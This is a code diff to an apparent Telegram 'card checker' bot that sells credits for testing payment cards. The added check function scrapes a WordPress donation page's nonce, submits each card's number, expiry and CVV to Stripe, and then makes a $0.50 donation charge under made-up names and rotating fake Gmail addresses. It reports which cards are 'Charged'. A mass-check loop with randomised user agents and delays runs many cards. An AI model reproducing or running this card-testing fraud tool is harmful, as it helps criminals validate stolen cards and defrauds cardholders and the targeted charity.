@@ -992,32 +992,257 @@ async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         reply_markup=reply_markup
     )
 
-async def check_single_card_fast(card):
-    """Working card checker from combined.py (Tele function)"""
+# Add this at the top with other global variables
+PRE_GENERATED_EMAILS = []
+EMAIL_INDEX = 0
+
+def generate_email_list(count=100):
+    """Generate a list of emails to reuse"""
+    global PRE_GENERATED_EMAILS
+    names = ["Kmo", "Waiyan", "John", "Mike", "David", "Sarah", "James", "Robert", "Michael", "William"]
+    PRE_GENERATED_EMAILS = []
+    
+    for i in range(count):
+        name = random.choice(names)
+        numbers = "".join(str(random.randint(0, 9)) for _ in range(4))
+        email = f"{name}{numbers}@gmail.com"
+        PRE_GENERATED_EMAILS.append(email)
+    
+    return PRE_GENERATED_EMAILS
+
+def get_next_email():
+    """Get next email from pre-generated list"""
+    global EMAIL_INDEX, PRE_GENERATED_EMAILS
+    
+    if not PRE_GENERATED_EMAILS:
+        generate_email_list(100)
+    
+    email = PRE_GENERATED_EMAILS[EMAIL_INDEX]
+    EMAIL_INDEX = (EMAIL_INDEX + 1) % len(PRE_GENERATED_EMAILS)
+    return email
+
+# Initialize email list
+generate_email_list(100)
+
+# Global session for reuse
+checker_session = None
+last_session_time = 0
+
+async def get_or_create_session():
+    """Get existing session or create new one"""
+    global checker_session, last_session_time
+    
+    current_time = time.time()
+    
+    # Reuse session for up to 5 minutes
+    if checker_session and not checker_session.closed and current_time - last_session_time < 300:
+        return checker_session
+    
+    # Create new session
+    if checker_session and not checker_session.closed:
+        await checker_session.close()
+    
+    connector = aiohttp.TCPConnector(ssl=False)
+    timeout = aiohttp.ClientTimeout(total=15)
+    checker_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
+    last_session_time = current_time
+    
+    return checker_session
+
+async def check_single_card_ultrafast(card):
+    """ULTRA-FAST card checker with session reuse"""
     try:
         cc, mon, year, cvv = card.split("|")
         year = year[-2:] if len(year) == 4 else year
         cc_clean = cc.replace(" ", "")
         
-        # Use requests (synchronous) since combined.py uses it
-        # We'll run it in a thread to avoid blocking
-        loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(None, Tele_sync, card)
+        # Get session
+        session = await get_or_create_session()
         
-        # Map results like in combined.py
-        if "Donation Successful!" in result:
-            return card, "approved", "✅ Charged", 200
-        elif "Your card does not support this type of purchase" in result:
-            return card, "declined", "❌ Card not supported", 0
-        elif "security code is incorrect" in result or "security code is invalid" in result:
-            return card, "declined", "❌ Incorrect CVV", 0
-        elif "insufficient funds" in result:
-            return card, "declined", "❌ Insufficient Funds", 0
-        else:
-            return card, "declined", "❌ Declined", 0
+        # Get billing address
+        billing_address = get_billing_address(cc_clean[:6])
+        
+        # Step 1: Get checkout page ONCE and reuse
+        checkout_nonce = None
+        checkout_page = None
+        
+        # Try to get existing checkout page data
+        if hasattr(check_single_card_ultrafast, 'checkout_data'):
+            checkout_nonce = check_single_card_ultrafast.checkout_data.get('nonce')
+            checkout_page = check_single_card_ultrafast.checkout_data.get('html')
+        
+        if not checkout_nonce or not checkout_page:
+            headers = {
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                "user-agent": random.choice(USER_AGENTS),
+                "cache-control": "no-cache",
+                "pragma": "no-cache"
+            }
+            
+            async with session.get(
+                f"{DOMAIN}/donation/", 
+                headers=headers, 
+                timeout=10
+            ) as response:
+                if response.status != 200:
+                    return card, "declined", f"❌ Page Error {response.status}", response.status
+                
+                checkout_page = await response.text()
+                
+                # Extract nonce from page
+                nonce_pattern = r'wp_full_stripe_inline_donation_charge_nonce["\']?\s*:\s*["\']([^"\']+)["\']'
+                match = re.search(nonce_pattern, checkout_page)
+                if match:
+                    checkout_nonce = match.group(1)
+                else:
+                    # Try alternative pattern
+                    checkout_nonce = parseX(checkout_page, '"wp_full_stripe_inline_donation_charge_nonce":"', '"')
+                
+                if checkout_nonce:
+                    # Cache checkout data
+                    check_single_card_ultrafast.checkout_data = {
+                        'nonce': checkout_nonce,
+                        'html': checkout_page,
+                        'timestamp': time.time()
+                    }
+                else:
+                    return card, "declined", "❌ No checkout nonce", 0
+        
+        # Step 2: Create payment method with Stripe
+        headers1 = {
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "user-agent": random.choice(USER_AGENTS),
+        }
+        
+        data1 = {
+            "type": "card",
+            "billing_details[name]": billing_address["name"],
+            "card[number]": cc_clean,
+            "card[cvc]": cvv,
+            "card[exp_month]": mon,
+            "card[exp_year]": year,
+            "guid": "NA",
+            "muid": "NA",
+            "sid": "NA",
+            "payment_user_agent": "stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element",
+            "key": PK,
+        }
+        
+        async with session.post(
+            "https://api.stripe.com/v1/payment_methods", 
+            headers=headers1, 
+            data=data1, 
+            timeout=5
+        ) as response:
+            if response.status == 200:
+                req1 = await response.text()
+            else:
+                # Clear cached checkout data on error
+                if hasattr(check_single_card_ultrafast, 'checkout_data'):
+                    delattr(check_single_card_ultrafast, 'checkout_data')
+                return card, "declined", f"❌ Stripe Error {response.status}", response.status
+        
+        try:
+            pm_data = json.loads(req1)
+            if 'error' in pm_data:
+                error_msg = pm_data['error'].get('message', 'Stripe error')
+                error_type = pm_data['error'].get('type', '')
+                
+                # Check if it's an actual card decline
+                is_card_error = any(x in error_type.lower() for x in ['card_error', 'invalid_request_error'])
+                is_decline = any(x in error_msg.lower() for x in ['card', 'declined', 'insufficient', 'invalid', 'incorrect', 'expired'])
+                
+                if is_card_error or is_decline:
+                    return card, "declined", f"❌ {error_msg[:30]}", pm_data['error'].get('code', 0)
+                else:
+                    return card, "declined", f"❌ Error: {error_msg[:30]}", pm_data['error'].get('code', 0)
+            
+            pmid = pm_data.get('id')
+            if not pmid:
+                return card, "declined", "❌ No Payment ID", 0
+        except json.JSONDecodeError:
+            return card, "declined", "❌ Invalid Response", 0
+        
+        # Step 3: Process donation with pre-generated email
+        headers2 = {
+            "accept": "application/json, text/javascript, */*; q=0.01",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "origin": DOMAIN,
+            "referer": f"{DOMAIN}/donation/",
+            "user-agent": random.choice(USER_AGENTS),
+            "x-requested-with": "XMLHttpRequest",
+        }
+        
+        # Use pre-generated email
+        email = get_next_email()
+        
+        data2 = {
+            "action": "wp_full_stripe_inline_donation_charge",
+            "wpfs-form-name": "donate",
+            "wpfs-form-get-parameters": "%7B%7D",
+            "wpfs-custom-amount": "other",
+            "wpfs-custom-amount-unique": "0.50",
+            "wpfs-donation-frequency": "one-time",
+            "wpfs-billing-name": billing_address['name'],
+            "wpfs-billing-address-country": billing_address['country'],
+            "wpfs-billing-address-line-1": billing_address.get('address_line_1', '7246 Royal Ln'),
+            "wpfs-billing-address-line-2": '',
+            "wpfs-billing-address-city": billing_address['city'],
+            "wpfs-billing-address-state": '',
+            "wpfs-billing-address-state-select": billing_address['state'],
+            "wpfs-billing-address-zip": billing_address['postal_code'],
+            "wpfs-card-holder-email": email,
+            "wpfs-card-holder-name": billing_address['name'],
+            "wpfs-stripe-payment-method-id": pmid,
+            "_wpnonce": checkout_nonce,
+            "wp_full_stripe_inline_donation_charge_nonce": checkout_nonce,
+        }
+        
+        async with session.post(
+            f"{DOMAIN}/wp-admin/admin-ajax.php", 
+            headers=headers2, 
+            data=data2, 
+            timeout=5
+        ) as response:
+            if response.status == 200:
+                req2 = await response.text()
+            else:
+                # Clear cached checkout data on error
+                if hasattr(check_single_card_ultrafast, 'checkout_data'):
+                    delattr(check_single_card_ultrafast, 'checkout_data')
+                return card, "declined", f"❌ AJAX Error {response.status}", response.status
+        
+        try:
+            result_data = json.loads(req2)
+            if isinstance(result_data, dict) and result_data.get('success'):
+                # If approved, clear checkout cache to get fresh page next time
+                if hasattr(check_single_card_ultrafast, 'checkout_data'):
+                    delattr(check_single_card_ultrafast, 'checkout_data')
+                return card, "approved", f"✅ Charged | Email: {email}", 200
+            else:
+                error_msg = "Declined"
+                if isinstance(result_data, dict):
+                    if 'message' in result_data:
+                        error_msg = result_data.get('message', 'Declined')
+                    elif 'data' in result_data and isinstance(result_data['data'], dict):
+                        if 'error' in result_data['data']:
+                            error_obj = result_data['data']['error']
+                            if isinstance(error_obj, dict):
+                                error_msg = error_obj.get('message', 'Declined')
+                
+                # If declined, keep using same checkout page (don't clear cache)
+                return card, "declined", f"❌ {error_msg[:30]}", 0
+        except json.JSONDecodeError:
+            return card, "declined", "❌ Invalid JSON", 0
             
     except Exception as e:
-        logger.error(f"Error in check_single_card_fast: {e}")
+        # Clear cache on any exception
+        if hasattr(check_single_card_ultrafast, 'checkout_data'):
+            delattr(check_single_card_ultrafast, 'checkout_data')
+        logger.error(f"Error in check_single_card_ultrafast: {e}")
         return card, "declined", f"❌ Error: {str(e)[:20]}", 0
 
 def Tele_sync(card):
@@ -1234,26 +1459,15 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Check channel membership
     if not user.get('joined_channel', False):
-        keyboard = [
-            [InlineKeyboardButton("✅ Join Private Channel", url=CHANNEL_LINK)],
-            [InlineKeyboardButton("🔄 Verify Join", callback_data="verify_join")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        # Use HTML parsing to avoid markdown issues
-        welcome_text = f"""<b>🔒 CHANNEL JOIN REQUIRED</b>
+        await message.reply_text(
+            f"""<b>🔒 CHANNEL JOIN REQUIRED</b>
 ══════════════════════
 To Access {BOT_INFO['name']}, You Must Join Our Channel.
 
 <b>Steps:</b>
-1. Click 'Join Channel'
-2. After Joining Click 'Verify Join'
-"""
-        
-        await message.reply_text(
-            welcome_text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
+1. Join: {CHANNEL_LINK}
+2. Then use /start again""",
+            parse_mode=ParseMode.HTML
         )
         return
     
@@ -1305,13 +1519,14 @@ To Access {BOT_INFO['name']}, You Must Join Our Channel.
 • <code>/botinfo</code> - Bot Statistics
 """
     
-    welcome_text += """
+    welcome_text = """
 <b>Owner:</b> 👑 @ISHANT_OFFICIAL
 ══════════════════════
-""" 
+"""
+    
     await message.reply_text(
         welcome_text,
-        parse_mode=ParseMode.HTML,
+        parse_mode=ParseMode.HTML
     )
 
 async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1461,7 +1676,7 @@ async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /chk command for single card check"""
+    """Handle /chk command for single card check - ULTRA FAST"""
     user_id = update.effective_user.id
     user = await get_user(user_id)
     username = update.effective_user.username or "NoUsername"
@@ -1483,7 +1698,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "<b>Example:</b>\n"
             "<code>/chk 4111111111111111|12|2025|123</code>\n\n"
             "<b>Cost:</b> 1 credit per check\n"
-            "<b>Speed:</b> ⚡ Instant",
+            "<b>Speed:</b> ⚡ Ultra Fast (Session Reuse)",
             parse_mode=ParseMode.HTML
         )
         return
@@ -1518,21 +1733,21 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Send processing message
     processing_msg = await update.message.reply_text(
-        "<b>⚡ PROCESSING CARD...</b>\n",
+        "<b>⚡ ULTRA FAST PROCESSING...</b>\n"
+        "<i>Using cached session & pre-generated emails</i>",
         parse_mode=ParseMode.HTML
     )
     
     # Start timer for speed measurement
     start_time = time.time()
     
-    # Check the card using the working function
-    result_card, status, message_text, http_code = await check_single_card_fast(card_input)
+    # Check the card using ULTRA-FAST function
+    result_card, status, message_text, http_code = await check_single_card_ultrafast(card_input)
     
     # Calculate actual processing time
     actual_time = time.time() - start_time
     
     # Always deduct credit for checks
-    credit_deducted = True
     today_date = datetime.datetime.now().date().isoformat()
     
     updates = {
@@ -1565,7 +1780,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Refresh user data
     user = await get_user(user_id)
     
-        # Format result using universal format
+    # Format result
     result_text = format_universal_result(
         card_data=result_card,
         status=status,
@@ -1574,10 +1789,6 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username=username,
         time_taken=actual_time
     )
-    
-    # Log charged cards
-    if status == "approved":
-        log_charged_only(result_text, update.message.chat_id, username)
     
     # Update message with result
     await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
@@ -1680,42 +1891,31 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     files_storage[user_id]["invalid_cards"] = invalid_cards
 
 async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context):
-    """ULTRA-FAST mass checking with universal format"""
+    """ULTRA-FAST mass checking with session reuse"""
     processed = 0
     approved = 0
     declined = 0
-    credits_used = 0  # Track actual credits used
+    credits_used = 0
     user = await get_user(user_id)
-    username = None  # We'll get this from user data
-    
-    # Get username
-    user_data = await get_user(user_id)
-    username = user_data.get('username', 'NoUsername')
+    username = user.get('username', 'NoUsername')
     
     # Calculate initial credits
     initial_credits = user.get("credits", 0)
     
-    # Create session for reuse
-    connector = aiohttp.TCPConnector(ssl=False)
-    timeout = aiohttp.ClientTimeout(total=30)
-    
     try:
-        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-        
-        # Process cards one by one
+        # Process cards
         for i, card in enumerate(cards):
             # Check if cancelled
             if user_id in checking_tasks and checking_tasks[user_id]["cancelled"]:
                 break
             
-            # Update status every 5 cards
-            if i % 5 == 0 or i == len(cards) - 1:
-                elapsed = time.time() - checking_tasks[user_id]["start_time"]
+            # Update status every 10 cards for speed
+            if i % 10 == 0 or i == len(cards) - 1:
                 progress = (processed / len(cards)) * 100
                 
                 try:
                     await status_msg.edit_text(
-                        f"<b>🚀 MASS CHECK IN PROGRESS</b>\n"
+                        f"<b>🚀 ULTRA FAST MASS CHECK</b>\n"
                         f"══════════════════════\n"
                         f"<b>Total Cards:</b> {len(cards)}\n"
                         f"<b>Credits Used:</b> {credits_used}\n"
@@ -1732,36 +1932,17 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
             
             # Check single card
             start_time = time.time()
-            result_card, status, message, http_code = await check_single_card_fast(card)
+            result_card, status, message, http_code = await check_single_card_ultrafast(card)
             actual_time = time.time() - start_time
             
             processed += 1
             
-            # Update task data
-            if user_id in checking_tasks:
-                checking_tasks[user_id]["cards_processed"] = processed
-            
-            # Determine if it's an actual decline or error
-            message_lower = str(message).lower() if message else ""
-            is_actual_decline = any(keyword in message_lower for keyword in [
-                'card', 'declined', 'insufficient', 'invalid', 'incorrect', 
-                'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
-            ])
-            
-            is_error = any(keyword in message_lower for keyword in [
-                'setup error', 'timeout', 'http error', 'network error', 
-                'connection error', 'server error', 'internal error'
-            ])
-            
             if status == "approved":
                 approved += 1
                 credits_used += 1
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["approved"] = approved
                 
-                # Send approved result using universal format
+                # Send approved result
                 try:
-                    # Get current user credits
                     current_user = await get_user(user_id)
                     current_credits = current_user.get("credits", 0) - credits_used
                     
@@ -1780,39 +1961,24 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
                         parse_mode=ParseMode.HTML
                     )
                     
-                    # Log charged cards
-                    log_charged_only(result_text, chat_id, username)
-                    
                 except Exception as e:
                     logger.error(f"Error sending approved result: {e}")
                     
-            elif status == "declined" and is_actual_decline and not is_error:
-                declined += 1
-                credits_used += 1
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["declined"] = declined
             else:
-                # This was an error - don't count as decline for credit deduction
                 declined += 1
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["declined"] = declined
             
-            # Small delay to avoid rate limiting
+            # Small delay (tuned for speed)
             if i < len(cards) - 1:
-                delay = random.uniform(0.5, 1.5)
-                await asyncio.sleep(delay)
-        
-        # Close session
-        await session.close()
+                await asyncio.sleep(random.uniform(0.3, 0.8))
         
     except Exception as e:
         logger.error(f"Error in mass check: {e}")
     
-    # Final update after all cards processed
+    # Final update
     elapsed = time.time() - checking_tasks[user_id]["start_time"]
     success_rate = (approved / len(cards) * 100) if cards else 0
     
-    # Update user data with actual credits used
+    # Update user data
     updates = {
         'credits': initial_credits - credits_used,
         'credits_spent': user.get("credits_spent", 0) + credits_used,
@@ -1824,7 +1990,7 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
     }
     await update_user(user_id, updates)
     
-    # Update bot statistics with actual credits used
+    # Update bot statistics
     await update_bot_stats({
         'total_checks': processed,
         'total_credits_used': credits_used,
@@ -1832,16 +1998,10 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
         'total_declined': declined
     })
     
-    # Refresh user data
-    user = await get_user(user_id)
-    
-    # Send summary with universal format style
-    summary_text = f"""
-━━━━━━━━━━━━━━━━━━━━
-🎯 <b>MASS CHECK COMPLETE</b>
-━━━━━━━━━━━━━━━━━━━━
-
-📊 <b>STATISTICS</b>
+    # Send summary
+    summary_text = f"""<b>🎯 MASS CHECK COMPLETE</b>
+══════════════════════
+<b>Statistics:</b>
 • Total Cards: {len(cards)}
 • ✅ Approved: {approved}
 • ❌ Declined: {declined}
@@ -1849,11 +2009,8 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
 • Time Taken: {elapsed:.1f}s
 • Success Rate: {success_rate:.1f}%
 
-💳 <b>YOUR BALANCE</b>
-<code>{user.get('credits', 0)} credits</code>
-
-━━━━━━━━━━━━━━━━━━━━
-🤖 <b>DARKXCODE CHECKER</b>
+<b>Your Balance:</b> {initial_credits - credits_used} credits
+══════════════════════
 """
     
     try:
